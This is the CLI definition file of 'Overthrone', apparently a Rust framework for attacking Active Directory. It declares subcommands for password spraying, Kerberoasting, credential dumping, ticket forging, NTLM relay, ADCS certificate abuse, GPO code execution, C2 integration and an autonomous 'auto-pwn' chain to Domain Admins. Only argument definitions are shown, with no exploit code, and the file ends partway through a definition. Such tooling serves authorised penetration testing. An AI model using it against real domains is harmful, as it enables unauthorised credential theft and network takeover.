mod auth;
mod autopwn;
mod banner;
mod bloodhound_viewer;
mod commands;
mod commands_impl;
mod interactive_shell;
mod modules_ext;
mod ovt_config;
mod session_store;
mod tree_viewer;
mod tui;

use std::process::ExitCode;

use auth::{AuthMethod, Credentials};
use autopwn::{AdaptiveModeArg, AutoPwnArgs, ExecMethod, MaxStageArg, PlaybookArg};
use clap::{CommandFactory, Parser, Subcommand};
use clap_complete::{Shell as ClapShell, generate as clap_generate};
use colored::Colorize;
use overthrone_reaper::runner::ReaperConfig;
use tracing_subscriber::{EnvFilter, fmt};

use futures::StreamExt;
use overthrone_core::c2::C2Manager;
use overthrone_core::exec::modules as ovt_modules;
use overthrone_core::graph::AttackGraph;
use overthrone_core::plugin::{PluginContext, PluginRegistry};
use std::collections::HashMap;
use std::sync::{Arc, RwLock};

fn install_rustls_provider() -> Result<(), String> {
    if rustls::crypto::CryptoProvider::get_default().is_some() {
        return Ok(());
    }

    rustls::crypto::ring::default_provider()
        .install_default()
        .map_err(|_| "Failed to install rustls ring crypto provider".to_string())
}

// ──────────────────────────────────────────────────────────
// CLI Definition
// ──────────────────────────────────────────────────────────

#[derive(Parser)]
#[command(
    name = "overthrone",
    version,
    about = "Active Directory Offensive Toolkit",
    long_about = "Overthrone — AD enumeration, attack path analysis, and exploitation framework.\n\
    Written in Rust for speed and stealth."
)]
struct Cli {
    #[command(subcommand)]
    command: Box<Commands>,

    #[arg(
        short = 'H',
        long,
        global = true,
        env = "OT_DC_HOST",
        alias = "dc",
        alias = "dc-ip"
    )]
    dc_host: Option<String>,

    #[arg(short, long, global = true, env = "OT_DOMAIN")]
    domain: Option<String>,

    #[arg(short, long, global = true, env = "OT_USERNAME")]
    username: Option<String>,

    #[arg(
        short = 'p',
        long,
        global = true,
        env = "OT_PASSWORD",
        hide_env_values = true
    )]
    password: Option<String>,

    #[arg(long, global = true, env = "OT_NT_HASH", hide_env_values = true)]
    nt_hash: Option<String>,

    #[arg(long, global = true, env = "KRB5CCNAME")]
    ticket: Option<String>,

    #[arg(
        short = 'A',
        long,
        global = true,
        value_enum,
        default_value_t = AuthMethod::Password
    )]
    auth_method: AuthMethod,

    #[arg(short, long, global = true, action = clap::ArgAction::Count)]
    verbose: u8,

    #[arg(
        long = "output-format",
        global = true,
        value_enum,
        default_value = "text"
    )]
    stdout_format: OutputFormat,

    #[arg(short = 'O', long, global = true)]
    outfile: Option<String>,
}

#[derive(Clone, clap::ValueEnum)]
enum OutputFormat {
    Text,
    Json,
    Csv,
}

// ──────────────────────────────────────────────────────────
// Module subcommands
// ──────────────────────────────────────────────────────────

#[derive(Subcommand, Clone)]
enum ModuleAction {
    /// List registered modules (optionally filtered by category)
    List {
        /// Filter by category: Execute, Dump, Enum, Kerberos, Secrets, Scan, Coerce
        #[arg(short, long)]
        category: Option<String>,
    },

    /// Show detailed info for a module
    Info {
        /// Module name
        name: String,
    },

    /// Run a module against a single target
    Run {
        /// Module name
        name: String,
        /// Target host
        #[arg(short, long)]
        target: String,
        /// Optional JSON parameters for the module
        #[arg(long)]
        params: Option<String>,
    },

    /// Run a module against multiple targets in parallel
    RunParallel {
        /// Module name
        name: String,
        /// Comma-separated target hosts
        #[arg(short, long)]
        targets: String,
        /// Optional JSON parameters for the module
        #[arg(long)]
        params: Option<String>,
        /// Max concurrent targets
        #[arg(short = 'c', long, default_value = "10")]
        concurrency: usize,
    },
}

#[derive(Subcommand)]
enum Commands {
    /// Interactive wizard mode for AD engagements
    Wizard {
        #[command(flatten)]
        args: commands::wizard::WizardArgs,
    },

    /// Full AD enumeration via reaper modules
    Reaper {
        #[arg(long, short, value_delimiter = ',')]
        modules: Vec<String>,
        #[arg(long, default_value = "500")]
        page_size: u32,
    },

    /// Snaffler-style sensitive file discovery across readable SMB shares
    Snaffler {
        #[arg(long, default_value = "500")]
        page_size: u32,
    },

    /// Enumerate specific AD object types
    Enum {
        #[arg(value_enum)]
        target: EnumTarget,
        #[arg(long)]
        filter: Option<String>,
        #[arg(long, default_value = "false")]
        include_disabled: bool,
    },

    /// PowerView-style LDAP enumeration aliases backed by Overthrone modules
    #[command(alias = "pv", alias = "power-view")]
    Powerview {
        #[command(subcommand)]
        action: PowerViewAction,
    },

    /// Resolve common AD attribute/right GUIDs used in ACEs and ACLs
    Guid {
        #[command(subcommand)]
        action: GuidAction,
    },

    /// Kerberos operations
    #[command(alias = "krb", alias = "roast")]
    Kerberos {
        #[command(subcommand)]
        action: KerberosAction,
    },

    /// SMB operations
    Smb {
        #[command(subcommand)]
        action: SmbAction,
    },

    /// Remote command execution
    Exec {
        #[arg(short, long, value_enum, default_value = "auto")]
        method: ExecMethod,
        #[arg(short, long)]
        target: String,
        #[arg(short, long)]
        command: String,
    },

    /// Attack graph operations
    Graph {
        /// Load graph from JSON file instead of building from LDAP
        #[arg(short, long, global = true)]
        file: Option<String>,
        #[command(subcommand)]
        action: GraphAction,
    },

    /// Password spraying
    Spray {
        #[arg(short, long)]
        password: String,
        /// Optional path to username wordlist (one per line). Omit to use embedded list or --use-ldap.
        #[arg(short = 'U', long, alias = "users")]
        userlist: Option<String>,
        /// When set, attempt LDAP-based username enumeration (anonymous/null-session)
        #[arg(long)]
        use_ldap: bool,
        #[arg(long, default_value = "1")]
        delay: u64,
        #[arg(long, default_value = "0")]
        jitter: u64,
        /// Number of concurrent authentication attempts
        #[arg(long, default_value = "10")]
        concurrency: usize,
    },

    /// Autonomous attack chain — full killchain from enum to DA
    #[command(name = "auto-pwn", alias = "auto", alias = "autopwn")]
    AutoPwn {
        /// Goal: "Domain Admins", "ntds", "recon", hostname, or user
        #[arg(short, long, default_value = "Domain Admins")]
        target: String,
        /// Preferred remote execution method
        #[arg(short, long, value_enum, default_value = "auto")]
        method: ExecMethod,
        /// Stealth mode — low-noise actions, extra jitter
        #[arg(long, default_value = "false")]
        stealth: bool,
        /// Dry run — plan and display, no execution
        #[arg(long, default_value = "false")]
        dry_run: bool,
        /// Maximum stage to reach (enumerate, attack, escalate, lateral, loot, cleanup)
        #[arg(long, value_enum, default_value = "loot")]
        max_stage: MaxStageArg,
        /// Adaptive engine mode: heuristic, qlearning, or hybrid (default)
        #[arg(long, value_enum, default_value = "hybrid")]
        adaptive: AdaptiveModeArg,
        /// Path to persist Q-table across engagements
        #[arg(long, default_value = "q_table.json")]
        q_table: String,
        /// Jitter between steps (milliseconds)
        #[arg(long, default_value = "1000")]
        jitter_ms: u64,
        /// Use LDAPS (port 636)
        #[arg(long)]
        ldaps: bool,
        /// Per-step timeout (seconds)
        #[arg(long, default_value = "30")]
        timeout: u64,
        /// Run a named playbook instead of goal-driven planning
        #[arg(long, value_enum)]
        playbook: Option<PlaybookArg>,
        /// TOML config file to load targets/credentials/options from
        #[arg(short = 'C', long, value_name = "FILE")]
        config: Option<String>,
        /// Resume a previously saved session file
        #[arg(long, value_name = "SESSION_FILE")]
        resume: Option<String>,
    },

    /// Autonomous attack chain starting from no credentials (pre-auth enum + loot bootstrap)
    #[command(
        name = "auto-pwn-preauth",
        alias = "autopwn-preauth",
        alias = "auto-preauth"
    )]
    AutoPwnPreauth {
        /// Goal: "Domain Admins", "ntds", "recon", hostname, or user
        #[arg(short, long, default_value = "Domain Admins")]
        target: String,
        /// Preferred remote execution method
        #[arg(short, long, value_enum, default_value = "auto")]
        method: ExecMethod,
        /// Stealth mode — low-noise actions, extra jitter
        #[arg(long, default_value = "false")]
        stealth: bool,
        /// Dry run — plan and display, no execution
        #[arg(long, default_value = "false")]
        dry_run: bool,
        /// Maximum stage to reach (enumerate, attack, escalate, lateral, loot, cleanup)
        #[arg(long, value_enum, default_value = "loot")]
        max_stage: MaxStageArg,
        /// Adaptive engine mode: heuristic, qlearning, or hybrid (default)
        #[arg(long, value_enum, default_value = "hybrid")]
        adaptive: AdaptiveModeArg,
        /// Path to persist Q-table across engagements
        #[arg(long, default_value = "q_table.json")]
        q_table: String,
        /// Jitter between steps (milliseconds)
        #[arg(long, default_value = "1000")]
        jitter_ms: u64,
        /// Use LDAPS (port 636)
        #[arg(long)]
        ldaps: bool,
        /// Per-step timeout (seconds)
        #[arg(long, default_value = "30")]
        timeout: u64,
        /// Run a named playbook instead of goal-driven planning
        #[arg(long, value_enum)]
        playbook: Option<PlaybookArg>,
        /// TOML config file to load targets/credentials/options from
        #[arg(short = 'C', long, value_name = "FILE")]
        config: Option<String>,
        /// Resume a previously saved session file
        #[arg(long, value_name = "SESSION_FILE")]
        resume: Option<String>,
        /// Optional path to username wordlist (one per line) for preauth bootstrap
        #[arg(short = 'U', long)]
        userlist: Option<String>,
        /// When set, attempt LDAP-based username enumeration for bootstrap
        #[arg(long)]
        use_ldap: bool,
        /// Number of concurrent probes during preauth enumeration
        #[arg(long, default_value = "10")]
        concurrency: usize,
    },

    /// Credential dumping (SAM, LSA, NTDS, DCC2)
    Dump {
        #[arg(short, long)]
        target: String,
        #[arg(value_enum)]
        source: DumpSource,
    },

    /// Environment diagnostics — check dependencies and connectivity
    #[command(alias = "check", alias = "env")]
    Doctor {
        /// Specific checks to run (smb, kerberos, winrm, network)
        #[arg(long, short, value_delimiter = ',')]
        checks: Vec<String>,
        /// Domain controller to test connectivity against
        #[arg(long = "target-dc")]
        target_dc: Option<String>,
    },

    /// Generate engagement report (Markdown, PDF, JSON)
    Report {
        /// Input engagement state file
        #[arg(long, default_value = "engagement.json")]
        input: String,
        /// Output report file
        #[arg(
            id = "report_output",
            short = 'o',
            long = "output",
            value_name = "OUTPUT",
            default_value = "report.md"
        )]
        output: String,
        /// Report format
        #[arg(short = 'F', long, value_enum, default_value = "markdown")]
        format: ReportFormat,
    },

    /// Ticket forging operations (golden, silver tickets)
    Forge {
        #[command(subcommand)]
        action: ForgeAction,
    },

    /// Crack captured hashes (AS-REP, Kerberoast, NTLM)
    Crack {
        /// Hash string to crack (auto-detects type)
        #[arg(short = 's', long)]
        hash: Option<String>,
        /// File containing hashes (one per line)
        #[arg(short, long)]
        file: Option<String>,
        /// Cracking mode (fast, default, thorough)
        #[arg(short = 'M', long, value_enum, default_value = "default")]
        mode: CrackMode,
        /// Custom wordlist file
        #[arg(short = 'W', long)]
        wordlist: Option<String>,
        /// Maximum candidates to try (0 = unlimited)
        #[arg(long, default_value = "0")]
        max_candidates: usize,
    },

    /// RID cycling — enumerate users/groups via MS-SAMR (works unauthenticated)
    #[command(alias = "rid-cycle", alias = "rid-brute")]
    Rid {
        /// Start RID (default: 500)
        #[arg(long, default_value = "500")]
        start_rid: u32,
        /// End RID (default: 10500)
        #[arg(long, default_value = "10500")]
        end_rid: u32,
        /// Use null session (no credentials)
        #[arg(long, default_value = "false")]
        null_session: bool,
    },

    /// Lateral movement — trust mapping, escalation paths, MSSQL chains
    #[command(alias = "lateral")]
    Move {
        #[command(subcommand)]
        action: MoveAction,
    },

    /// GPP password decryption — decrypt cpassword from Group Policy XML
    Gpp {
        /// Path to local Groups.xml or similar GPP XML file
        #[arg(long)]
        file: Option<String>,
        /// Decrypt a raw cpassword string directly
        #[arg(long)]
        cpassword: Option<String>,
    },

    /// LAPS password reading — read local admin passwords from AD
    Laps {
        /// Only query a specific computer name
        #[arg(long)]
        computer: Option<String>,
    },

    /// Secrets dumping — offline SAM/LSA/DCC2 from registry hives
    Secrets {
        #[command(subcommand)]
        action: SecretsAction,
    },

    /// NTLM relay and responder — LLMNR/NBT-NS poisoning and credential relay
    #[command(alias = "relay")]
    Ntlm {
        #[command(subcommand)]
        action: NtlmAction,
    },

    /// ADCS certificate abuse — ESC1-ESC13 attacks
    #[command(alias = "certify")]
    Adcs {
        #[command(subcommand)]
        action: AdcsAction,
    },

    /// Interactive shell — persistent remote session
    Shell {
        /// Target host
        #[arg(short, long)]
        target: String,
        /// Shell type
        #[arg(short = 'T', long, value_enum, default_value = "winrm")]
        shell_type: ShellType,
    },

    /// SCCM/MECM abuse — client push, app deployment
    #[command(alias = "mecm")]
    Sccm {
        #[command(subcommand)]
        action: SccmAction,
    },

    /// Port scanner & unauthenticated discovery
    #[command(alias = "portscan", alias = "discovery")]
    Scan {
        /// Target hosts (IP, CIDR, or range)
        #[arg(short, long, required = true)]
        targets: String,
        /// Port range (e.g., 80,443 or top1000)
        #[arg(short = 'P', long, default_value = "top1000")]
        ports: String,
        /// Scan type
        #[arg(short = 'T', long, value_enum, default_value = "connect")]
        scan_type: ScanType,
        /// Timeout in milliseconds
        #[arg(long, default_value = "1000")]
        timeout: u64,
        /// Perform LDAP null session check
        #[arg(long, default_value = "true")]
        ldap: bool,
        /// Perform SMB null session check
        #[arg(long, default_value = "true")]
        smb: bool,
        /// Disable LDAP null session checks
        #[arg(long)]
        no_ldap: bool,
        /// Disable SMB null session checks
        #[arg(long)]
        no_smb: bool,
    },

    /// MSSQL operations — query execution, linked servers, xp_cmdshell
    #[command(alias = "sql")]
    Mssql {
        #[command(subcommand)]
        action: MssqlAction,
    },

    /// Launch interactive TUI with live attack graph
    #[clap(alias = "ui")]
    Tui {
        /// Domain to crawl
        #[arg(short, long)]
        domain: String,
        /// Start crawler automatically
        #[arg(short = 'c', long, default_value_t = true)]
        crawl: bool,
        /// Load graph from previous JSON export
        #[arg(short = 'l', long)]
        load: Option<String>,
    },

    // ─── NEW: Plugin System ──────────────────────────────────
    /// Plugin management — load, list, execute custom modules
    #[clap(alias = "plug")]
    Plugin {
        #[clap(subcommand)]
        action: PluginAction,
    },

    /// Module management — list and run registered built-in modules
    Module {
        #[command(subcommand)]
        action: ModuleAction,
    },

    // ─── NEW: C2 Integration ─────────────────────────────────
    /// C2 framework integration — Cobalt Strike, Sliver, Havoc
    C2 {
        #[clap(subcommand)]
        action: C2Action,
    },

    // ─── NEW: ACL Abuse ──────────────────────────────────────
    /// ACL/DACL abuse — force-change passwords, add group members, write DACLs
    #[command(alias = "dacl")]
    Acl {
        #[command(subcommand)]
        action: AclAction,
    },

    // ─── NEW: GPO Abuse ──────────────────────────────────────
    /// Group Policy abuse — write ImmediateTask XML to SYSVOL for code execution
    Gpo {
        #[command(subcommand)]
        action: GpoAction,
    },

    // ─── Shell completion generation ────────────────────────
    /// Generate shell tab-completion scripts
    #[command(name = "completions", alias = "completion", hide = true)]
    Completions {
        /// Shell to generate completions for
        #[arg(value_enum)]
        shell: CompletionShell,
        /// Write completions to file instead of stdout
        #[arg(
            id = "completions_output",
            short = 'o',
            long = "output",
            value_name = "OUTPUT"
        )]
        output: Option<String>,
    },
}

#[derive(Debug, Clone, clap::ValueEnum)]
enum CrackMode {
    /// Fast mode - minimal rules, quick cracking
    Fast,
    /// Default mode - balanced rules and speed
    Default,
    /// Thorough mode - all rules, exhaustive search
    Thorough,
}

#[derive(Debug, Clone, clap::ValueEnum)]
enum ReportFormat {
    Markdown,
    Pdf,
    Json,
}

#[derive(Debug, Clone, Copy, clap::ValueEnum)]
enum CompletionShell {
    /// Bash shell
    Bash,
    /// Fish shell
    Fish,
    /// Zsh shell
    Zsh,
    /// PowerShell
    PowerShell,
    /// Elvish shell
    Elvish,
}

// ──────────────────────────────────────────────────────────
// Forge sub-commands
// ──────────────────────────────────────────────────────────

#[derive(Subcommand)]
enum ForgeAction {
    /// Forge a Golden Ticket (TGT using krbtgt hash)
    Golden {
        /// Domain SID (e.g., S-1-5-21-...)
        #[arg(long)]
        domain_sid: String,
        /// User to impersonate (default: Administrator)
        #[arg(long, default_value = "Administrator")]
        user: String,
        /// User RID (default: 500 for Administrator)
        #[arg(long, default_value = "500")]
        rid: u32,
        /// krbtgt NT hash (32 hex chars)
        #[arg(long)]
        krbtgt_hash: String,
        /// Output file for the ticket
        #[arg(
            id = "forge_golden_output",
            short = 'o',
            long = "output",
            value_name = "OUTPUT",
            default_value = "golden.kirbi"
        )]
        output: String,
    },
    /// Forge a Silver Ticket (TGS using service account hash)
    Silver {
        /// Domain SID
        #[arg(long)]
        domain_sid: String,
        /// User to impersonate
        #[arg(long, default_value = "Administrator")]
        user: String,
        /// User RID
        #[arg(long, default_value = "500")]
        rid: u32,
        /// Target SPN (e.g., cifs/dc01.corp.local)
        #[arg(long)]
        spn: String,
        /// Service account NT hash
        #[arg(long)]
        service_hash: String,
        /// Output file for the ticket
        #[arg(
            id = "forge_silver_output",
            short = 'o',
            long = "output",
            value_name = "OUTPUT",
            default_value = "silver.kirbi"
        )]
        output: String,
    },
}

// ──────────────────────────────────────────────────────────
// Enum targets
// ──────────────────────────────────────────────────────────

#[derive(Clone, clap::ValueEnum)]
enum EnumTarget {
    /// No-credential AD service triage plus anonymous LDAP RootDSE probe
    Pre,
    /// Anonymous LDAP RootDSE probe without username, password, or domain
    Anonymous,
    /// Null-session RID cycling through MS-SAMR where the target permits it
    NullSession,
    Users,
    Computers,
    Groups,
    Trusts,
    Spns,
    Asrep,
    Delegations,
    Gpos,
    Laps,
    Policy,
    All,
}

#[derive(Subcommand, Clone)]
enum PowerViewAction {
    /// Get-DomainUser equivalent
    Users {
        #[arg(long)]
        identity: Option<String>,
        #[arg(long)]
        filter: Option<String>,
        #[arg(long, default_value = "false")]
        include_disabled: bool,
    },
    /// Get-DomainComputer equivalent
    Computers {
        #[arg(long)]
        filter: Option<String>,
        #[arg(long, default_value = "false")]
        include_disabled: bool,
    },
    /// Get-DomainGroup equivalent
    Groups {
        #[arg(long, alias = "identity")]
        group: Option<String>,
        #[arg(long)]
        filter: Option<String>,
    },
    /// Get-DomainTrust equivalent
    Trusts,
    /// Get-DomainSPNTicket / Get-DomainUser -SPN style discovery
    Spns,
    /// AS-REP roastable user discovery
    Asrep,
    /// Delegation discovery
    Delegations,
    /// Get-DomainGPO equivalent
    Gpos {
        #[arg(long, alias = "identity")]
        name: Option<String>,
    },
    /// Domain policy and password policy discovery
    Policy,
    /// LAPS-readable computer discovery and read
    Laps {
        #[arg(long)]
        computer: Option<String>,
    },
    /// Find-InterestingDomainAcl-style abusable ACE enumeration
    Acls {
        #[arg(long)]
        sid: Option<String>,
    },
    /// Run the full LDAP-backed enumeration set
    All,
}

#[derive(Subcommand, Clone)]
enum GuidAction {
    /// Resolve a GUID, right name, or attribute name
    Resolve { value: String },
    /// List the built-in GUID/right mappings
    List {
        #[arg(long)]
        filter: Option<String>,
    },
}

// ──────────────────────────────────────────────────────────
// Kerberos sub-commands
// ──────────────────────────────────────────────────────────

#[derive(Subcommand, Clone)]
enum KerberosAction {
    Roast {
        #[arg(long)]
        spn: Option<String>,
    },
    AsrepRoast {
        /// Optional file with usernames to roast (one per line)
        #[arg(short = 'U', long)]
        userlist: Option<String>,
    },
    /// Zero-knowledge username enumeration via Kerberos AS-REQ probes (no creds needed)
    UserEnum {
        /// Optional path to username wordlist (one per line). Omit to use the embedded candidate list.
        #[arg(short = 'U', long)]
        userlist: Option<String>,
        /// Output file for discovered valid usernames
        #[arg(
            id = "kerberos_user_enum_output",
            short = 'o',
            long = "output",
            value_name = "OUTPUT"
        )]
        output: Option<String>,
        /// Delay between probes in milliseconds (evasion)
        #[arg(long, default_value = "0")]
        delay: u64,
        /// Concurrent Kerberos probes to run at once
        #[arg(long, default_value = "10")]
        concurrency: usize,
        /// When set, try to derive usernames from LDAP (anonymous/null-session)
        #[arg(long)]
        use_ldap: bool,
    },
    GetTgt,
    GetTgs {
        #[arg(long)]
        spn: String,
    },
}

// ──────────────────────────────────────────────────────────
// SMB sub-commands
// ──────────────────────────────────────────────────────────

#[derive(Subcommand, Clone)]
enum SmbAction {
    Shares {
        #[arg(short, long)]
        target: String,
    },
    Admin {
        #[arg(short, long)]
        targets: String,
    },
    Spider {
        #[arg(short, long)]
        target: String,
        #[arg(long, default_value = ".kdbx,.key,.pem,.config,.ps1,.rdp")]
        extensions: String,
    },
    Get {
        #[arg(short, long)]
        target: String,
        #[arg(short = 'P', long)]
        path: String,
    },
    Put {
        #[arg(short, long)]
        target: String,
        #[arg(short, long)]
        local: String,
        #[arg(short, long)]
        remote: String,
    },
}

// ──────────────────────────────────────────────────────────
// Graph sub-commands
// ──────────────────────────────────────────────────────────

#[derive(Subcommand, Clone)]
enum GraphAction {
    Build,
    /// Launch the local Rust BloodHound-style graph visualizer.
    #[command(alias = "visual", alias = "ui", alias = "viz")]
    View {
        /// BloodHound/Overthrone JSON files or directories. Defaults to --file or attack_graph.json.
        #[arg(short = 'i', long = "input")]
        input: Vec<String>,
    },
    /// Launch the browser-based graph GUI.
    #[command(alias = "web", alias = "browser")]
    Gui {
        /// Overthrone/BloodHound JSON files or directories (directories are selectable per JSON).
        #[arg(short = 'i', long = "input")]
        input: Vec<String>,
        /// Port to bind (0 selects a free port).
        #[arg(short = 'P', long = "port", default_value = "0")]
        port: u16,
    },
    /// Launch the local Rust BloodHound-style interactive tree explorer.
    #[command(alias = "hierarchy", alias = "explore")]
    Tree {
        /// BloodHound/Overthrone JSON files or directories. Defaults to --file or attack_graph.json.
        #[arg(short = 'i', long = "input")]
        input: Vec<String>,
    },
    Path {
        #[arg(long)]
        from: String,
        #[arg(short, long)]
        to: String,
    },
    PathToDa {
        #[arg(long)]
        from: String,
    },
    Stats,
    Export {
        #[arg(
            id = "graph_export_output",
            short = 'o',
            long = "output",
            value_name = "OUTPUT",
            default_value = "graph.json"
        )]
        output: String,
        /// Export in BloodHound-compatible format
        #[arg(short = 'B', long)]
        bloodhound: bool,
    },
}

// ──────────────────────────────────────────────────────────
// Dump sources
// ──────────────────────────────────────────────────────────

#[derive(Debug, Clone, clap::ValueEnum)]
enum DumpSource {
    Sam,
    Lsa,
    Ntds,
    Dcc2,
}

// ──────────────────────────────────────────────────────────
// Move sub-commands
// ──────────────────────────────────────────────────────────

#[derive(Subcommand)]
enum MoveAction {
    /// Display trust relationships from LDAP enumeration
    Trusts,
    /// Find cross-domain escalation paths
    Escalation,
    /// Analyze MSSQL linked servers for cross-domain chains
    Mssql,
    /// Print full trust map visualization
    Map,
}

// ──────────────────────────────────────────────────────────
// Secrets sub-commands
// ──────────────────────────────────────────────────────────

#[derive(Subcommand)]
enum SecretsAction {
    /// Dump SAM hive — extract local account NTLM hashes
    Sam {
        /// Path to SAM registry hive file
        #[arg(long)]
        sam: String,
        /// Path to SYSTEM registry hive file
        #[arg(long)]
        system: String,
    },
    /// Dump LSA secrets — service account passwords, DPAPI keys
    Lsa {
        /// Path to SECURITY registry hive file
        #[arg(long)]
        security: String,
        /// Path to SYSTEM registry hive file
        #[arg(long)]
        system: String,
    },
    /// Dump DCC2 cached domain credentials (mscash2)
    Dcc2 {
        /// Path to SECURITY registry hive file
        #[arg(long)]
        security: String,
        /// Path to SYSTEM registry hive file
        #[arg(long)]
        system: String,
    },
}

// ──────────────────────────────────────────────────────────
// NTLM sub-commands
// ──────────────────────────────────────────────────────────

#[derive(Subcommand, Clone)]
enum NtlmAction {
    /// Capture NTLM hashes (Responder-style)
    Capture {
        /// Network interface to listen on
        #[arg(short, long, default_value = "0.0.0.0")]
        interface: String,
        /// Port to listen on
        #[arg(short = 'P', long, default_value = "445")]
        port: u16,
        /// Relay-only mode: skip poisoner/responder, use pre-captured hashes
        #[arg(long)]
        no_poison: bool,
    },
    /// Relay NTLM authentication to targets
    Relay {
        /// Target hosts (format: ip:port)
        #[arg(short, long, required = true, value_delimiter = ',')]
        targets: Vec<String>,
        /// Listen port
        #[arg(short = 'P', long, default_value = "445")]
        port: u16,
        /// Command to execute on successful relay
        #[arg(short, long)]
        command: Option<String>,
        /// Relay-only mode: skip poisoner/responder, use pre-captured hashes
        #[arg(long)]
        no_poison: bool,
    },
    /// SMB-specific relay with signing bypass
    SmbRelay {
        /// Target SMB hosts
        #[arg(short, long, required = true, value_delimiter = ',')]
        targets: Vec<String>,
        /// SMB port
        #[arg(short = 'P', long, default_value = "445")]
        port: u16,
        /// Command to execute
        #[arg(short, long)]
        command: Option<String>,
    },
    /// HTTP/HTTPS relay
    HttpRelay {
        /// Target HTTP hosts
        #[arg(short, long, required = true, value_delimiter = ',')]
        targets: Vec<String>,
        /// HTTP port
        #[arg(short = 'P', long, default_value = "80")]
        port: u16,
        /// Command to execute via WinRM
        #[arg(short, long)]
        command: Option<String>,
    },
}

// ──────────────────────────────────────────────────────────
// ADCS sub-commands
// ──────────────────────────────────────────────────────────

#[derive(Subcommand)]
enum AdcsAction {
    /// Enumerate certificate templates and ADCS configuration
    Enum {
        /// Target CA server
        #[arg(short, long)]
        ca: Option<String>,
    },
    /// ESC1 — Web Enrollment with SAN abuse
    Esc1 {
        #[arg(short, long, required = true)]
        ca: String,
        #[arg(short, long, required = true)]
        template: String,
        #[arg(short = 'U', long, required = true)]
        target_user: String,
        #[arg(
            id = "adcs_esc1_output",
            short = 'o',
            long = "output",
            value_name = "OUTPUT",
            default_value = "esc1_cert.pfx"
        )]
        output: String,
    },
    /// ESC2 — Web Enrollment with any template
    Esc2 {
        #[arg(short, long, required = true)]
        ca: String,
        #[arg(short, long, required = true)]
        template: String,
        #[arg(
            id = "adcs_esc2_output",
            short = 'o',
            long = "output",
            value_name = "OUTPUT",
            default_value = "esc2_cert.pfx"
        )]
        output: String,
    },
    /// ESC3 — Enrollment Agent abuse
    Esc3 {
        #[arg(short, long, required = true)]
        ca: String,
        #[arg(short, long, required = true)]
        agent_template: String,
        #[arg(short, long, required = true)]
        target_template: String,
        #[arg(short = 'U', long, required = true)]
        target_user: String,
    },
    /// ESC4 — Vulnerable certificate template ACLs
    Esc4 {
        #[arg(short, long, required = true)]
        ca: String,
        #[arg(short, long, required = true)]
        template: String,
    },
    /// ESC5 — Vulnerable CA configuration
    Esc5 {
        #[arg(short, long, required = true)]
        ca: String,
    },
    /// ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 enabled
    Esc6 {
        #[arg(short, long, required = true)]
        ca: String,
        #[arg(short, long, required = true)]
        target_user: String,
    },
    /// ESC7 — Vulnerable CA permissions
    Esc7 {
        #[arg(short, long, required = true)]
        ca: String,
    },
    /// ESC8 — ADCS Web Enrollment relay
    Esc8 {
        #[arg(short = 'w', long, required = true)]
        url: String,
        #[arg(short, long, required = true)]
        target_user: String,
    },
    /// ESC9 — No Security Extension (CT_FLAG_NO_SECURITY_EXTENSION + UPN poisoning)
    Esc9 {
        /// CA web enrollment server (e.g. `<http://ca.corp.local>`)
        #[arg(short, long, required = true)]
        ca: String,
        /// Certificate template name (must have CT_FLAG_NO_SECURITY_EXTENSION)
        #[arg(short, long, required = true)]
        template: String,
        /// Target UPN to impersonate (e.g. Administrator@corp.local)
        #[arg(short = 'T', long, required = true)]
        target_upn: String,
        /// Victim account whose UPN will be temporarily modified
        #[arg(short = 'V', long, required = true)]
        victim: String,
        /// Original UPN of the victim account (for restoration)
        #[arg(short = 'R', long, required = true)]
        original_upn: String,
        /// LDAP URL (for UPN modification commands, e.g. ldap://dc01.corp.local)
        #[arg(short, long, default_value = "ldap://dc01.corp.local")]
        ldap_url: String,
        /// LIVE DC IP/hostname — when provided with ldap-user/ldap-pass/ldap-domain/victim-dn
        /// enables fully automated UPN poisoning via exploit_with_ldap()
        #[arg(long = "target-dc")]
        target_dc: Option<String>,
        /// LIVE LDAP bind username for live UPN modification
        #[arg(long)]
        ldap_user: Option<String>,
        /// LIVE LDAP bind password for live UPN modification
        #[arg(long)]
        ldap_pass: Option<String>,
        /// LIVE LDAP domain (e.g. corp.local)
        #[arg(long)]
        ldap_domain: Option<String>,
        /// LIVE Full distinguished name of the victim account (e.g. CN=alice,CN=Users,DC=corp,DC=local)
        #[arg(long)]
        victim_dn: Option<String>,
        /// LIVE Use LDAPS (port 636) for the live LDAP modification
        #[arg(long)]
        ldaps: bool,
        /// Output PFX file path
        #[arg(
            id = "adcs_esc9_output",
            short = 'o',
            long = "output",
            value_name = "OUTPUT",
            default_value = "esc9_cert.pfx"
        )]
        output: String,
    },
    /// ESC10 — Weak Certificate Mapping (StrongCertificateBindingEnforcement / CertificateMappingMethods)
    Esc10 {
        /// CA web enrollment server
        #[arg(short, long, required = true)]
        ca: String,
        /// Certificate template to enroll in
        #[arg(short, long, required = true)]
        template: String,
        /// Target UPN to impersonate
        #[arg(short = 'T', long, required = true)]
        target_upn: String,
        /// ESC10 variant: 'a' (StrongCertificateBindingEnforcement=0) or 'b' (CertificateMappingMethods UPN bit)
        #[arg(short = 'V', long, default_value = "a")]
        variant: String,
        /// [Variant B / LIVE] Victim account name whose UPN is temporarily overwritten
        #[arg(long)]
        victim: Option<String>,
        /// [Variant B / LIVE] Full distinguished name of the victim account
        #[arg(long)]
        victim_dn: Option<String>,
        /// [Variant B / LIVE] Victim's original UPN (restored after cert is issued)
        #[arg(long)]
        original_upn: Option<String>,
        /// [Variant B / LIVE] DC IP/hostname for LDAP
        #[arg(long = "target-dc")]
        target_dc: Option<String>,
        /// [Variant B / LIVE] LDAP bind username
        #[arg(long)]
        ldap_user: Option<String>,
        /// [Variant B / LIVE] LDAP bind password
        #[arg(long)]
        ldap_pass: Option<String>,
        /// [Variant B / LIVE] LDAP domain
        #[arg(long)]
        ldap_domain: Option<String>,
        /// [Variant B / LIVE] Use LDAPS (port 636)
        #[arg(long)]
        ldaps: bool,
        /// Output PFX file path
        #[arg(
            id = "adcs_esc10_output",
            short = 'o',
            long = "output",
            value_name = "OUTPUT",
            default_value = "esc10_cert.pfx"
        )]
        output: String,
    },
    /// ESC11 — Relay NTLM to ICPR (ICertPassage; IF_ENFORCEENCRYPTICERTREQUEST disabled)
    Esc11 {
        /// CA hostname or IP address
        #[arg(short, long, required = true)]
        ca_host: String,
        /// CA common name (e.g. corp-CA01)
        #[arg(short = 'N', long, required = true)]
        ca_name: String,
        /// Certificate template to request for the relayed identity
        #[arg(short, long, required = true)]
        template: String,
        /// LIVE SMB username — when provided with smb-pass and smb-domain enables live
        /// InterfaceFlags registry read via assess_with_smb() instead of guidance-only
        #[arg(long)]
        smb_user: Option<String>,
